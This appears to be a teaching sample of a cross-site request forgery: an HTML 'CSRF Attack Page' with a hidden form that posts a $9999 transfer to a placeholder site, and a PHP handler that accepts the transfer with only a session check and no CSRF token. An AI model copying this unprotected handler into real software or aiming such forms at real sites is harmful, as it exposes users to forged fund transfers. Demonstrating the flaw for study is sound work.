<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Page</title>
</head>
<body>
    <h1>CSRF Attack Page</h1>

    <form action="http://example.com/process.php" method="post">
        <input type="hidden" name="action" value="transfer">
        <input type="hidden" name="amount" value="9999">
        <input type="submit" value="Transfer $9999">
    </form>
</body>
</html>
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if ($_POST['action'] === 'transfer') {
        // Check if the user is logged in (you can implement your authentication logic here)
        if (isset($_SESSION['user'])) {
            // Process the fund transfer
            $amount = $_POST['amount'];
            
            // You should implement a secure way to handle the transfer

            echo "Transfer of $amount was successful.";
        } else {
            echo "You are not logged in.";
        }
    } else {
        echo "Invalid action.";
    }
} else {
    echo "Invalid request method.";
}
?>
